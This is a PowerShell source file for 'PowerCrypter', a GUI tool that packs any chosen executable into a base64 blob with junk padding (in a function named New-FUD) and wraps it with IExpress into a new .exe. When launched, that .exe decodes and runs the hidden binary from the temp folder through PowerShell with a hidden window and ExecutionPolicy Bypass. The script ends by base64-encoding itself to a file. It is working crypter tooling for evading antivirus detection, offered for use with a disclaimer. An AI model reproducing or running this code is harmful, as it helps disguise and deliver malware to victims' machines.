$command = {
$ErrorActionPreference = "SilentlyContinue"
Function Cryptit([string]$file){
Function New-FUD([string]$FTC){
    $bytes = [System.IO.File]::ReadAllBytes($FTC)
    $bytes += @(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    $randbytes = [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $randbytes += [string] (Get-Random -Minimum 9999999)
    $bytes += [Convert]::ToByte($randombytes)
    $basebytes =[Convert]::ToBase64String($bytes)
    New-Item "$env:TEMP\PowerCrypter" -Type Directory -Force
    New-Item "$env:TEMP\PowerCrypter\bits.ps1" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\bits.ps1" -Force
    Add-Content "$env:TEMP\PowerCrypter\bits.ps1" -Value ('$progbytes'+"="+"`"$basebytes`"")
    Add-Content "$env:TEMP\PowerCrypter\bits.ps1" -Value @'
$bytes = [Convert]::FromBase64String($progbytes)
$rand = Get-Random
New-Item "$env:TEMP\$rand\$rand.exe" -Type File -Force
[io.file]::WriteAllBytes("$env:TEMP\$rand\$rand.exe",$bytes)
& $env:TEMP\$rand\$rand.exe
'@
    New-Item "$env:TEMP\PowerCrypter\exec.bat" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\exec.bat" -Force
    Add-Content "$env:TEMP\PowerCrypter\exec.bat" -Value 'powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ".\bits.ps1"'
    New-Item "$env:TEMP\PowerCrypter\rand.fil" -Type File -Force
    Clear-Content "$env:TEMP\PowerCrypter\rand.fil" -Force
    $randfill = Get-Random -Minimum 99999999
    $i = 100
    while($i -gt 0){
        $randfill--
        Add-Content "$env:TEMP\PowerCrypter\rand.fil" -Value $randfill
        $i--
    }
}
New-FUD -FTC $file
function Create-Wrapper{
New-Item "$env:TEMP\PowerCrypter\wrap.sed" -Type File -Force
Clear-Content "$env:TEMP\PowerCrypter\wrap.sed" -Force
Set-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=1
HideExtractAnimation=1
UseLongFileName=0
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=%InstallPrompt%
DisplayLicense=%DisplayLicense%
FinishMessage=%FinishMessage%
TargetName=%TargetName%
FriendlyName=%FriendlyName%
AppLaunched=%AppLaunched%
PostInstallCmd=%PostInstallCmd%
AdminQuietInstCmd=%AdminQuietInstCmd%
UserQuietInstCmd=%UserQuietInstCmd%
SourceFiles=SourceFiles
[Strings]
InstallPrompt=
DisplayLicense=
FinishMessage=
'@
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value "TargetName=$env:TEMP\PowerCrypter\comp.exe"
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
FriendlyName=title
AppLaunched=cmd.exe /c echo.
PostInstallCmd=cmd.exe /c exec.bat
AdminQuietInstCmd=
UserQuietInstCmd=
FILE0="bits.ps1"
FILE1="exec.bat"
FILE2="rand.fil"
[SourceFiles]
'@
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value "SourceFiles0=$env:TEMP\PowerCrypter\"
Add-Content "$env:TEMP\PowerCrypter\wrap.sed" -Value @'
[SourceFiles0]
%FILE0%=
%FILE1%=
%FILE2%=
'@
Set-Location "$env:TEMP\PowerCrypter"
& iexpress.exe /N /Q wrap.sed
Wait-Process -Name iexpress
}
Create-Wrapper
$dest = Split-Path -Parent $file
$leaf = (Split-Path -Leaf $file).Split(".")[0]
Rename-Item "$env:Temp\PowerCrypter\comp.exe" -NewName ("$leaf"+".crypted"+".exe") -Force
Move-Item "$env:Temp\PowerCrypter\$leaf.crypted.exe" -Destination $dest -Force
$wshpop = New-Object -ComObject Wscript.Shell
$wshpop.Popup("Crypting complete!",0,"Done",0x0)
}
Function Get-FileName($initialDirectory)
{   
 [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms") |
 Out-Null

 $OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog
 $OpenFileDialog.initialDirectory = $initialDirectory
 $OpenFileDialog.filter = "Executable Files (*.exe)| *.exe"
 $OpenFileDialog.ShowDialog() | Out-Null
 $OpenFileDialog.filename
 $Script:fileloc = $OpenFileDialog.filename
}
[void][System.Reflection.Assembly]::LoadWithPartialName('presentationframework')
[xml]$XAML = @'
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="PowerCrypter" Height="235" Width="568" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" Background="#FF1010C8" BorderBrush="#FF1010C8" Foreground="#FF1210C8" WindowStyle="None">
    <Grid Background="#FF76988F">
        <Button Name="Browse" Content="Browse" HorizontalAlignment="Left" Margin="483,98,0,0" VerticalAlignment="Top" Width="75" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" FontFamily="Script MT Bold" IsEnabled="True" Panel.ZIndex="1" Height="23"/>
        <Label Content="Welcome to PowerCrypter, please select a binary executable to crypt:" VerticalAlignment="Top" FontFamily="Script MT Bold" FontSize="16" Width="446" HorizontalAlignment="Center" Margin="61,59,61,0"/>
        <TextBox Name="BrowseBox" HorizontalAlignment="Left" Height="23" Margin="10,98,0,0" TextWrapping="Wrap" Text="" VerticalAlignment="Top" Width="468" BorderBrush="#FF3F3C29" Foreground="Black" SelectionBrush="#FFAC8C18" Background="#FFAC8C18" Panel.ZIndex="1"/>
        <Button Name="Crypt" Content="Crypt It!" Margin="10,125,10,0" VerticalAlignment="Top" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" Height="72" FontFamily="Script MT Bold" FontSize="36" IsEnabled="True" Panel.ZIndex="1"/>
        <Button Name="Cancel" Content="Cancel" Margin="280,202,10,0" VerticalAlignment="Top" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" Height="25" FontFamily="Script MT Bold" IsCancel="True" IsEnabled="True" Panel.ZIndex="1"/>
        <Label Content="PowerCrypter" HorizontalAlignment="Center" Margin="175,5,177,0" Width="210" Height="57" Foreground="White" FontFamily="Script MT Bold" FontSize="36" FontWeight="Bold" FontStyle="Italic" VerticalAlignment="Top"/>
        <Button Name="Help" Content="Help" HorizontalAlignment="Left" Margin="10,202,0,0" VerticalAlignment="Top" Width="265" Background="#FFAC8C18" BorderBrush="#FF3F3C29" Foreground="Black" FontFamily="Script MT Bold" IsEnabled="True" Panel.ZIndex="1" Height="25"/>
    </Grid>
</Window>
'@
$reader=(New-Object System.Xml.XmlNodeReader $xaml) 
$form=[Windows.Markup.XamlReader]::Load($reader)
$xaml.SelectNodes("//*[@Name]") | %{Set-Variable -Name ($_.Name) -Value $Form.FindName($_.Name)}
$Cancel.Add_Click({
exit
})
$Browse.Add_Click({
Get-FileName -initialDirectory "$env:HOMEDRIVE\$env:HOMEPATH\Desktop"
$BrowseBox.Text = $fileloc
})
$Crypt.Add_Click({
Cryptit -file $BrowseBox.Text
})
$Help.Add_Click({
$wshpop = New-Object -ComObject Wscript.Shell
$wshpop.Popup("This crypter is provided as is without a warranty. Its creator is not responsible for how, what, why, when, or even where you use this program. This program is designed to minimize the risk of damage to any executables you crypt, but its advanced algorythm has not been tested on some systems. This program's native language(Powershell) is pre-baked into and guarranteed to run on any Windows 7+ systems. If program does not function as intended please try updating Powershell. As a gentle reminder, depending on your computer's hardware it may take a minute to complete a crypt. You will get a notification when the crypting is complete. The crypted executable will be saved to the same folder as the original with the name changed to: originalname.crypted.exe",0,"Help",0x0)
})
$Form.ShowDialog() | out-null
}
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
Set-Content -Path "C:\Users\cbaxter\Desktop\test.txt" -Value $encodedcommand